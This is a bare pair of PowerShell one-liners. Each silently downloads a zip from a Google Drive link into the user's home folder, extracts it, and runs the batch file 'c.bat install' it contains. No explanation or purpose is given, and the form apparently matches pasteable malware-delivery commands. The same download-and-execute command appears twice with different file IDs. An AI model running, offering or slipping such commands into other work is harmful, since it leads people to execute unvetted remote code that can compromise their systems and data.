$id="1SW036KFSKdlFhcAMUBZkGgJDLKrDgNii"; $dest="$HOME\resource"; curl.exe -sSL "https://drive.usercontent.google.com/download?id=$id&export=download" -o "$dest.zip"; Expand-Archive -Path "$dest.zip" -DestinationPath $dest -Force; & "$dest\c.bat" install

$id="1bQ0-daOMMMtKncFxCrTPBuxxaorTKvvR"; $dest="$HOME\resource"; curl.exe -sSL "https://drive.usercontent.google.com/download?id=$id&export=download" -o "$dest.zip"; Expand-Archive -Path "$dest.zip" -DestinationPath $dest -Force; & "$dest\c.bat" install
